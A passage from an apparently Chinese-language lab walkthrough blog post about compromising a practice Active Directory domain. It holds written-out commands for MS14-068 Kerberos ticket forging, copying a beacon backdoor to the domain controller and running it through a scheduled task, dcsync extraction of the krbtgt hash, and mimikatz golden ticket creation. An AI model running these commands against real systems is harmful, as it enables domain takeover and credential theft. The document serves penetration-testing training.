+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512212553216.png" alt="image-20250512212553216" loading="lazy" decoding="async"></p>
+<h4 id="cs-ms14-068提权到域控" tabindex="-1"><a class="headerlink" href="#cs-ms14-068提权到域控" aria-hidden="true"></a> cs ms14-068提权到域控</h4>
+<p>上传文件<code>ms14-068</code>到<code>web</code>服务器上，执行如下命令，<code>SID</code>来源前面<code>MSF</code>获取的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514000630970.png" alt="image-20250514000630970" loading="lazy" decoding="async"></p>
+<h5 id="在ms14-068py脚本下创建票据" tabindex="-1"><a class="headerlink" href="#在ms14-068py脚本下创建票据" aria-hidden="true"></a> 在ms14-068.py脚本下创建票据</h5>
+<p>还可以使用<code>ms14-068.py</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>进行票据的创建。这里<code>mac</code>用户有一个坑点，执行时候要使用到<code>python2</code>，我的<code>proxychains-ng</code>编译成了<code>arm64</code>格式，但是<code>ms14-068.py</code>使用的执行环境是<code>python2</code>，<code>python2</code>是<code>x86</code>的，二者冲突了。难搞☹️。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514102745723.png" alt="image-20250514102745723" loading="lazy" decoding="async"></p>
+<p>这里如果使用<code>kali</code>应该是没问题的，使用下面的命令直接就可以了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python2 ms14-068.py -u web@hackbox.com -s S-1-5-21-2005268815-6584D69957-1189185684-1103 -d 10.10.10.149 -p &#x27;!@#@we456&#x27;</span><br></pre></td></tr></table></figure>
+<h5 id="krbcredexport-将-ccache-文件转化为-kirbi-格式" tabindex="-1"><a class="headerlink" href="#krbcredexport-将-ccache-文件转化为-kirbi-格式" aria-hidden="true"></a> <strong>KrbCredExport</strong> 将 <strong>.ccache</strong> 文件转化为 <strong>kirbi</strong> 格式</h5>
+<p>使用前面<code>MS14-068.exe</code>获取的<code>TGT_web@hackbox.com.ccache</code>，使用<code>KrbCredExport.py</code><sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>将其转化为<code>user.ticket</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py ./ccaches/TGT_web@hackbox.com.ccache ./tickets/user.ticket</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514103702160.png" alt="image-20250514103702160" loading="lazy" decoding="async"></p>
+<h5 id="导入票据访问dc" tabindex="-1"><a class="headerlink" href="#导入票据访问dc" aria-hidden="true"></a> 导入票据访问dc</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use ./tickets/user.ticket</span><br><span class="line">shell dir \\dc\c$</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105022907.png" alt="image-20250514105022907" loading="lazy" decoding="async"></p>
+<h4 id="获取dc域控权限" tabindex="-1"><a class="headerlink" href="#获取dc域控权限" aria-hidden="true"></a> 获取dc域控权限</h4>
+<p>目前是有了访问<code>dc</code>的权限，下面尝试获取<code>dc</code>域控的控制权限。</p>
+<h5 id="设置smb连接器，进行正向连接" tabindex="-1"><a class="headerlink" href="#设置smb连接器，进行正向连接" aria-hidden="true"></a> 设置smb连接器，进行正向连接</h5>
+<p>创建一个连接器。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105827103.png" alt="image-20250514105827103" loading="lazy" decoding="async"></p>
+<p>生成<code>exe</code>，并上传到域控上。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514110655360.png" alt="image-20250514110655360" loading="lazy" decoding="async"></p>
+<h5 id="复制后门文件到域控中并执行" tabindex="-1"><a class="headerlink" href="#复制后门文件到域控中并执行" aria-hidden="true"></a> 复制后门文件到域控中并执行</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy beacon.exe \\dc\c$\beacon.exe</span><br><span class="line">shell net time \\dc</span><br><span class="line">shell at \\dc 11:49:00 c:/beacon.exe</span><br></pre></td></tr></table></figure>
+<p>添加定时任务。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115225164.png" alt="image-20250514115225164" loading="lazy" decoding="async"></p>
+<h5 id="在beacon正向连接上dc" tabindex="-1"><a class="headerlink" href="#在beacon正向连接上dc" aria-hidden="true"></a> 在beacon正向连接上dc</h5>
+<p><code>link dc</code>连接上<code>dc</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115403150.png" alt="image-20250514115403150" loading="lazy" decoding="async"></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115454588.png" alt="image-20250514115454588" loading="lazy" decoding="async"></p>
+<h4 id="获取dc明文哈希" tabindex="-1"><a class="headerlink" href="#获取dc明文哈希" aria-hidden="true"></a> 获取dc明文哈希</h4>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115901753.png" alt="image-20250514115901753" loading="lazy" decoding="async"></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115954384.png" alt="image-20250514115954384" loading="lazy" decoding="async"></p>
+<h4 id="cs制作黄金票据" tabindex="-1"><a class="headerlink" href="#cs制作黄金票据" aria-hidden="true"></a> cs制作黄金票据</h4>
+<h5 id="在域控上执行命令导出krbtgt信息" tabindex="-1"><a class="headerlink" href="#在域控上执行命令导出krbtgt信息" aria-hidden="true"></a> 在域控上执行命令导出krbtgt信息</h5>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">dcsync hackbox.com hackbox\krbtgt</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514120300664.png" alt="image-20250514120300664" loading="lazy" decoding="async"></p>
+<p>获取数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域:hackbox.com</span><br><span class="line">krbtgt的NTLM哈希值为:6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">域的SID（普通用户的SID除去最后三位就是域的SID）:S-1-5-21-2005268815-658469957-1189185684</span><br></pre></td></tr></table></figure>
+<h5 id="在web服务器上制作黄金票据" tabindex="-1"><a class="headerlink" href="#在web服务器上制作黄金票据" aria-hidden="true"></a> 在web服务器上制作黄金票据</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:x2ntest1 /domain:hackbox.com /sid:S-1-5-21-2005268815-658469957-1189185684 /krbtgt:6f60ace6accbcb76078ccc0312174e98 /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514121400389.png" alt="image-20250514121400389" loading="lazy" decoding="async"></p>
+<p>未使用票据前，访问失败。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122841610.png" alt="image-20250514122841610" loading="lazy" decoding="async"></p>
+<p>使用黄金票据后，可以直接访问域控了。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123111483.png" alt="image-20250514123111483" loading="lazy" decoding="async"></p>
+<h2 id="flag获取" tabindex="-1"><a class="headerlink" href="#flag获取" aria-hidden="true"></a> FLAG获取</h2>
+<h3 id="web-flag1" tabindex="-1"><a class="headerlink" href="#web-flag1" aria-hidden="true"></a> Web flag1</h3>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122330806.png" alt="image-20250514122330806" loading="lazy" decoding="async"></p>
+<h3 id="web-flag2" tabindex="-1"><a class="headerlink" href="#web-flag2" aria-hidden="true"></a> Web flag2</h3>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122516477.png" alt="image-20250514122516477" loading="lazy" decoding="async"></p>
+<h3 id="dc-flag3" tabindex="-1"><a class="headerlink" href="#dc-flag3" aria-hidden="true"></a> DC flag3</h3>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123200938.png" alt="image-20250514123200938" loading="lazy" decoding="async"></p>
+<h2 id="参考" tabindex="-1"><a class="headerlink" href="#参考" aria-hidden="true"></a> 参考</h2>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/baicaix86/p/16418840.html">https://www.cnblogs.com/baicaix86/p/16418840.html</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn4" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn5" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn6" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-05-14 17:22:38
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" title="黄金票据">
+                        #黄金票据
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%9F%9F%E6%8E%A7/" title="域控">
+                        #域控
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        <b>#</b> 内网渗透
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text"> 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text"> 端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text"> nmap获取系统和版本信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-text"> 对网站进行测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ffuf%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-text"> ffuf目录文件扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wcdb%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text"> wc.db文件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-text"> thinkphp日志文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%97%A5%E5%BF%97%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-text"> 提取日志获取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#host%E7%A2%B0%E6%92%9E%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text"> host碰撞管理后台子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96webshell"><span class="toc-text"> 上传文件获取webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> MSF进行提权和信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-text"> 生成攻击载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF"><span class="toc-text"> 监听上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#migrate%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-text"> migrate迁移进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87%E8%8E%B7%E5%8F%96"><span class="toc-text"> mimikatz哈希明文获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text"> 跨网段域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%B7%A8%E7%BD%91%E6%AE%B5%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text"> MSF跨网段的域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-text"> 确认域环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-text"> 定位域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 域信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-text"> 终端执行信息收集命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%BF%87%E7%9A%84%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-text"> 获取登陆过的用户信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E6%B8%97%E9%80%8Fdc%E5%9F%9F%E6%8E%A7"><span class="toc-text"> 添加路由渗透DC域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86%E9%80%9A%E5%9F%9F%E6%8E%A7"><span class="toc-text"> 开启代理通域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E9%80%9A%E8%BF%87proxychains%E6%89%AB%E6%8F%8F%E5%9F%9F%E6%8E%A7%E8%AE%BE%E5%A4%87"><span class="toc-text"> nmap通过proxychains扫描域控设备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17-010%E8%BF%9B%E8%A1%8C%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BBdc%E5%A4%B1%E8%B4%A5"><span class="toc-text"> 永恒之蓝ms17-010进行溢出攻击DC(失败)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ms14-068%E6%8F%90%E6%9D%83%E5%9F%9F%E6%8E%A7"><span class="toc-text"> ms14-068提权域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ms14-068%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text"> ms14-068的条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ms14-068%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-text"> ms14-068创建票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%BD%E5%85%A5kiwi%E6%B8%85%E7%90%86%E5%86%85%E5%AD%98%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%86%8D%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-text"> 载入kiwi清理内存票据，再导入票据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E5%9F%9F%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90"><span class="toc-text"> 获取dc域控制权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91%E8%BD%BD%E8%8D%B7copy%E5%A4%8D%E5%88%B6%E5%88%B0%E5%9F%9F%E6%8E%A7%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text"> 生成正向载荷,copy复制到域控,并执行定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4"><span class="toc-text"> 获取域控权限命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87"><span class="toc-text"> 获取dc域控哈希明文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%9F%9F%E6%8E%A7%E5%85%A8%E9%83%A8hash"><span class="toc-text"> 抓域控全部hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text"> 制作黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ntml-sid-rid"><span class="toc-text"> 获取ntml sid rid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E5%9F%9F%E6%8E%A7%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90"><span class="toc-text"> 窃取域控超级管理权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text"> 生成黄金票据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text"> CS进行内网域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bteamserver"><span class="toc-text"> 建立teamserver</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8web%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%B8%8B%E8%BD%BDpowershell%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-text"> 在web服务器上执行下载powershell恶意代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%97%B4%E9%9A%94%E6%97%B6%E9%97%B4"><span class="toc-text"> 设置间隔时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash%E5%92%8C%E5%9F%9F%E5%86%85%E4%BF%A1%E4%BB%BB%E4%B8%BB%E6%9C%BA"><span class="toc-text"> 获取hash和域内信任主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%8E%AF%E5%A2%83%E5%86%85%E4%B8%BB%E6%9C%BA"><span class="toc-text"> 扫描环境内主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8cs%E9%9B%86%E6%88%90%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 利用cs集成命令进行信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs-mimikatz-web%E6%9C%8D%E5%8A%A1%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87"><span class="toc-text"> cs mimikatz web服务获取明文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dir%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7dc"><span class="toc-text"> dir访问域控DC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs-ms14-068%E6%8F%90%E6%9D%83%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-text"> cs ms14-068提权到域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8ms14-068py%E8%84%9A%E6%9C%AC%E4%B8%8B%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-text"> 在ms14-068.py脚本下创建票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#krbcredexport-%E5%B0%86-ccache-%E6%96%87%E4%BB%B6%E8%BD%AC%E5%8C%96%E4%B8%BA-kirbi-%E6%A0%BC%E5%BC%8F"><span class="toc-text"> KrbCredExport 将 .ccache 文件转化为 kirbi 格式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE%E8%AE%BF%E9%97%AEdc"><span class="toc-text"> 导入票据访问dc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-text"> 获取dc域控权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEsmb%E8%BF%9E%E6%8E%A5%E5%99%A8%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text"> 设置smb连接器，进行正向连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%88%B0%E5%9F%9F%E6%8E%A7%E4%B8%AD%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-text"> 复制后门文件到域控中并执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8beacon%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E4%B8%8Adc"><span class="toc-text"> 在beacon正向连接上dc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E6%98%8E%E6%96%87%E5%93%88%E5%B8%8C"><span class="toc-text"> 获取dc明文哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 